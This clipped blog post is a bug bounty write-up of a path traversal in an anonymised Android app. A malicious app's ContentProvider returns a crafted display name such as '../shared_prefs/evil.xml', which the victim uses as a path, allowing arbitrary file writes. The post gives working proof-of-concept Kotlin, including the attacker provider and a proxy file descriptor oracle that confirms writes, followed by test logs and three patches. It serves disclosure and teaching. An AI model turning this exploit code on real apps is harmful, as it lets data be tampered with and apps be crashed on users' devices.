---
title: "No Root, No Problem: Turning a ContentProvider into Its Own Oracle"
source: https://dispatchersdotplayground.hashnode.dev/no-root-no-problem-turning-a-contentprovider-into-its-own-oracle
source_host: dispatchersdotplayground.hashnode.dev
clip_date: 2026-11-19T10:50:48+08:00
trace_id: 6f188773-48e8-477f-b9c7-8b4b81ff35d6
content_hash: 6b0b06f6ef99fa810fea76e06e13c448df3101b7c7aa73962caabba3c21b6b5d
status: synced
tags: []
series: null
feed_source: Stavro·Android逆向
ai_summary: null
ai_summary_style: null
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 41d75244-d011-81d2-8f67-cb7a2551f013
ioc: null
---

During a recent bug bounty engagement I found a path traversal in an Android app that lets any other app on the device write arbitrary files into its private storage. The attacker app needs no permissions, the victim doesn't need to be logged in, and the attacker controls both where the file goes and what's in it. The vendor fixed and rewarded the issue under a private program, so I've anonymised the app throughout.

The attack is simple. The malicious app sends the victim an intent that points at a file it serves itself:

```kotlin
val intent = Intent(Intent.ACTION_VIEW).apply {
    setClassName("com.victim.app", "com.victim.app.ImportActivity")
    setDataAndType(Uri.parse("content://com.attacker.files/doc"), "application/pdf")
}
startActivity(intent)
```

To import it, the victim asks the attacker's `ContentProvider` what the file is called, and then uses the answer as a path:

```kotlin
// The name comes from the *sender's* ContentProvider — attacker-controlled
val name = cursor.getString(cursor.getColumnIndex(OpenableColumns.DISPLAY_NAME))

// ...and is used directly as a path
val target = File(cacheDir, name)   // name = "../shared_prefs/evil.xml"
FileOutputStream(target).use { out ->
    contentResolver.openInputStream(uri)!!.copyTo(out)
}
```

So the victim reaches out to the attacker for a filename and trusts whatever comes back. Spotting this took minutes. Proving it took a lot longer, because my test device wasn't rooted and I couldn't look inside the victim's private folder to see whether the file had landed. This post covers both: how the bug works, and how I got the attacker's own `ContentProvider` to tell me whether the write succeeded.

## How Android apps share files

Android apps don't share files by passing raw paths to each other. Every app's private storage is locked to its own user ID, so a path like `/data/data/com.attacker/files/doc.pdf` is useless to anyone else. Instead, the app that owns the file exposes it through a `ContentProvider` and hands out a `content://` URI. The receiving app never sees a real file. It asks the provider questions through two calls:

`query()`: The provider returns a cursor with metadata columns, typically `_display_name` and `_size`.

`openFile()`: The provider returns a file descriptor the receiver can read from.

This is how "Share" and "Open with" work all over Android. A typical receiver looks like this:

```kotlin
contentResolver.query(uri, null, null, null, null)?.use { cursor ->
    if (cursor.moveToFirst()) {
        val name = cursor.getString(cursor.getColumnIndex(OpenableColumns.DISPLAY_NAME))
        // e.g. "invoice.pdf", shown to the user or used to save a copy
    }
}
```

What's easy to forget is that whoever owns the provider writes both answers. `_display_name` isn't read from a filesystem. It's whatever string the provider decides to return. A well-behaved provider returns `invoice.pdf`. A malicious one can return anything:

```kotlin
class EvilProvider : ContentProvider() {
    override fun query(uri: Uri, projection: Array<String>?, selection: String?,
                       selectionArgs: Array<String>?, sortOrder: String?): Cursor {
        return MatrixCursor(arrayOf(OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE)).apply {
            addRow(arrayOf("../shared_prefs/evil.xml", payload.size))
        }
    }
    // openFile() serves the payload bytes — covered later
}
```

Treat `_display_name` like a file uploaded to a web server: useful for showing to the user, dangerous as a path. Google calls out this exact mistake in its Android security guidance under "Improperly trusting `ContentProvider` -provided filename". The app I tested made it anyway.

## Inside the victim: from intent to file write

The entry point is an activity the app uses to open documents. It's exported with no permission, so any installed app can start it:

```xml
<activity
    android:name=".ImportActivity"
    android:exported="true"
    android:launchMode="singleTop"
    android:noHistory="true" />
```

When the activity starts, it decides what kind of link it received. HTTP(S) URLs are treated as deep links. Anything else is treated as a file to import, and on Android 10+ that branch has no permission check. It runs straight away, before the user is asked to log in:

```kotlin
val isWebLink = URLUtil.isHttpsUrl(uri) || URLUtil.isHttpUrl(uri)
```

```java
if (isWebLink) {
    handleDeepLink(uri)
} else if (Build.VERSION.SDK_INT >= 29) {
    importFile(uri)          // our content:// URI ends up here
}
```

`importFile()` queries the URI for its metadata. Because the URI belongs to the attacker, this calls into the attacker's provider, which returns the malicious name. The interesting part is what happens next:

```kotlin
var name: String? = null
cursor?.use {
    if (it.moveToFirst()) {
        name = it.getString(it.getColumnIndex(OpenableColumns.DISPLAY_NAME))   // taken as-is
    }
}

if (name == null) {
    // Fallback: no name from the provider, so derive one from the URI
    val path = uri.path!!
    name = path.substring(path.lastIndexOf('/') + 1)                           // basename only
}
```

The developer clearly knew paths can't be trusted. When they build a name from the URI, they cut it down to the last segment. But that safeguard only runs on the fallback branch. The value that actually reaches the sink, the provider's `_display_name`, is used exactly as it came in.

That name goes into a background task that copies the file into the cache directory:

```kotlin
val target = File(cacheDir, name)                 // cache/../shared_prefs/evil.xml
contentResolver.openInputStream(uri)?.use { input ->
    FileOutputStream(target).use { output ->      // creates or truncates the file
        input.copyTo(output)
    }
}
```

`File(parent, child)` only joins strings; it doesn't resolve... The kernel does that when the file is opened, so

```
/data/user/0/com.victim.app/cache/../shared_prefs/evil.xml
```

becomes

```
/data/user/0/com.victim.app/shared_prefs/evil.xml
```

and the attacker's bytes are written there.

One last detail: after the copy, the app tries to wrap the file in a FileProvider URI to display it. The file now sits outside the FileProvider's configured roots, so that call throws and the user sees an error. By then it doesn't matter. The write has already happened, and the error appears after the damage is done.

## Proving the write without root

The bug was clear in the decompiled code, but "the code looks vulnerable" isn't proof. I needed to show the file actually landed. On a rooted device that's one ls. Mine wasn't rooted, and another app's private directory is invisible to everyone except that app. So the question became: can the attacker find out from the outside whether the write succeeded?

Look at the order in which the victim does things:

```javascript
contentResolver.openInputStream(uri)    // 1. always happens — calls our openFile()
FileOutputStream(target)                // 2. throws if the target directory doesn't exist
input.copyTo(output)                    // 3. reads our data — only if step 2 succeeded
```

If the destination can't be opened, step 2 throws `FileNotFoundException` and step 3 never runs. Whether the victim reads our bytes tells us whether its file open succeeded. The question is how to see those reads.

> *💡 Quick pause: If your team ships Android apps and you'd like someone to look for bugs like this before an attacker does, that's what I do. I also build apps, not just break them. See what I offer at* [*apksherlock.github.io/apksherlock*](http://apksherlock.github.io/apksherlock)*.*

### Making the reads visible

If `openFile()` returns a normal file descriptor, the victim reads it directly through the kernel and the attacker never sees a thing. But since API 26, `StorageManager.openProxyFileDescriptor()` returns a descriptor whose reads are routed back to callbacks in the provider's own process. Every read() the victim makes turns into an `onRead()` call in the attacker app:

```kotlin
override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor {
    val name = uri.getQueryParameter("name") ?: DEFAULT_NAME
    val payload = payloadFor(name)
    val sm = context!!.getSystemService(StorageManager::class.java)

    return sm.openProxyFileDescriptor(
        ParcelFileDescriptor.MODE_READ_ONLY,
        object : ProxyFileDescriptorCallback() {
            private var total = 0

            override fun onGetSize() = payload.size.toLong()

            override fun onRead(offset: Long, size: Int, data: ByteArray): Int {
                if (offset >= payload.size) return 0
                val n = minOf(size.toLong(), payload.size - offset).toInt()
                System.arraycopy(payload, offset.toInt(), data, 0, n)
                total += n
                return n
            }

            override fun onRelease() {
                if (total == 0)
                    Log.w(TAG, "[$name] VICTIM READ 0 bytes -> open FAILED")
                else
                    Log.w(TAG, "[$name] VICTIM READ $total/${payload.size} -> WRITE SUCCEEDED")
            }
        },
        Handler(callbackThread.looper)
    )
}
```

The attacker's provider is now its own oracle: it serves the file and also reports what the victim did with it.

To run several tests without rebuilding, the provider takes the name from a?name= query parameter on its own URI and echoes it back from query(). The victim never reads that parameter. It's just a convenient way for the attacker to pick the name it will serve:

```kotlin
fun fireImport(displayName: String) {
    val uri = Uri.parse("content://com.attacker.files/doc").buildUpon()
        .appendQueryParameter("name", displayName)
        .build()
    startActivity(Intent(Intent.ACTION_VIEW).apply {
        setClassName("com.victim.app", "com.victim.app.ImportActivity")
        setDataAndType(uri, "application/pdf")
        addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
    })
}
```

### One test proves nothing, three prove it

A single successful write could be explained away. Maybe the app strips the path and the file just went into cache/. So I ran three cases with the same filename:

| Case | *display* name | Expected if traversal works | Purpose |
| --- | --- | --- | --- |
| A   | poc.pdf | write succeeds | control |
| B   | ../zzz_no_such_dir/poc.pdf | open fails: directory doesn't exist | proves the path is honoured |
| C   | ../databases/poc.pdf | write succeeds: databases/ exists | proves the escape from cache/ |

A vs. B is the key comparison. Same filename, different result. If the app stripped the path down to poc.pdf, B would behave exactly like A. It doesn't, so the directory part is being used. B vs. C has the same../ shape, but C targets a directory that exists, and it succeeds. That's a write outside cache/.

```bash
query(content://com.attacker.files/doc?name=poc.pdf) -> _display_name=poc.pdf
  victim read 64 byte(s) at offset 0 [poc.pdf]
VERDICT [poc.pdf]: VICTIM READ 64/64 bytes -> WRITE SUCCEEDED

query(...?name=..%2Fzzz_no_such_dir%2Fpoc.pdf) -> _display_name=../zzz_no_such_dir/poc.pdf
VERDICT [../zzz_no_such_dir/poc.pdf]: VICTIM READ 0 bytes -> open FAILED

query(...?name=..%2Fdatabases%2Fpoc.pdf) -> _display_name=../databases/poc.pdf
  victim read 77 byte(s) at offset 0 [../databases/poc.pdf]
VERDICT [../databases/poc.pdf]: VICTIM READ 77/77 bytes -> WRITE SUCCEEDED
```

The default case, `../shared_prefs/poc_owned.xml`, also read its full 218 bytes, which put a valid `SharedPreferences` file into the app's preferences directory.

One caveat, to be precise: a full read proves the destination file was opened (created or truncated) and that the copy loop ran over every byte. That the bytes then reached the disk is an inference, but a very safe one, since there's nothing between the read and the write that could fail silently. For a developer with a debugger it takes seconds to confirm.

## Impact and limits

What the attacker gets is an arbitrary file write inside the victim's sandbox: any path the victim app can write to, with content the attacker chooses. The only requirement is a malicious app installed on the same device. That app needs no permissions, just a entry so Android lets it see the victim package:

```xml
<queries>
    <package android:name="com.victim.app" />
</queries>
```

What that write can be used for:

-   Overwriting existing files. `FileOutputStream` truncates whatever is already at the target. Pointing it at the app's database or preferences file replaces real data with attacker data, or breaks the app entirely.
-   Planting configuration. A crafted `SharedPreferences` XML in `shared_prefs/` is a valid file the app will load. `Prefs` that are already loaded live in memory, so a planted file takes effect on the next cold start unless the app writes its own copy first.
-   Denial of service. A corrupted database or `prefs` file can make the app crash on every launch until the user clears its data.

There are also real limits, and they matter for how bad this is:

-   It stays inside the sandbox. `../../` climbs to `/data/user/0/`, but other apps' directories belong to other user IDs. The write can only reach what the victim app itself can write.
-   The target directory has to exist. `FileOutputStream` doesn't create parent directories, so the attacker can write into `shared_prefs/`, `databases/`, `files/` and so on, but can't invent new folders. This is the same property that made case B fail.
-   It isn't silent. The import activity opens briefly and the user sees an error. The malicious app just has to be in the foreground to launch it, which is easy to arrange.

What I didn't show is code execution. That's the ceiling for this bug class: if an app loads anything executable from its private storage (downloaded DEX, native libraries, cached scripts), an arbitrary write there becomes running code in the victim's process. I didn't find such a loader in this app, so the impact I reported was data tampering and denial of service. If you find this bug elsewhere, that's the first thing to look for.

## Patching

Unexporting the activity or protecting it with a permission would close this entry point. Those are worth doing if no other app needs to launch the activity, but they're defence in depth. The actual bug is trusting `_display_name` as a path, and any other route to the same code would bring it back. There are three ways to fix that, from weakest to strongest.

1.  Strip the name down to a filename. Keep only the last path segment and reject what's left if it's empty or a dot-name:

```kotlin
val safeName = File(name).name
require(safeName.isNotEmpty() && safeName != "." && safeName != "..")
val target = File(cacheDir, safeName)
```

This is the minimal fix, and it's what the app's own fallback branch was already doing for URI paths.

2.  Canonicalise and check containment. Resolve the final path and confirm it's still inside the directory you meant to write to:

```kotlin
val target = File(cacheDir, name)
val base = cacheDir.canonicalPath + File.separator
if (!target.canonicalPath.startsWith(base)) {
    throw SecurityException("Path traversal attempt: $name")
}
```

The File.separator matters. Without it, `cache_evil/` would pass a check for cache.

3.  Don't use the sender's name for storage at all. Write to a name you generate, and keep `_display_name` only for showing to the user:

```kotlin
val target = File(cacheDir, UUID.randomUUID().toString())
val label = name   // display only, never touches the filesystem
```

Option 3 removes the problem instead of filtering it, and it's what I'd recommend. If the attacker's string never becomes part of a path, there's nothing left to validate.

## Conclusion

**For developers**: anything that comes back from another app's `ContentProvider` is input, and that includes the metadata. `_display_name` is a label for showing to the user, not a path. This app already sanitised the value it built itself and missed the one an attacker could control. When you validate a value on one branch, check that every other branch feeding the same sink does the same.

**For researchers**: finding the sink is usually the easy part. Proving it under realistic conditions is what gets a report accepted. When you can't see the result of a write directly, look at the code around it. Anything that only happens after the write succeeds can work as an oracle. Here it was the victim reading my bytes, and `openProxyFileDescriptor()` made those reads visible in my own process. Pair the oracle with a control case and a case that should fail (A, B and C). One positive result can be explained away, but a differential is hard to argue with.

No root, no problem. A non-rooted device doesn't stop you proving a bug. You just have to get the target to tell you what happened.

> *💡 If you found this useful and need help with an Android app, whether that's a security assessment, development, or something in between, you can find me at* [*apksherlock.github.io/apksherlock*](http://apksherlock.github.io/apksherlock)*. I'm always happy to talk.*
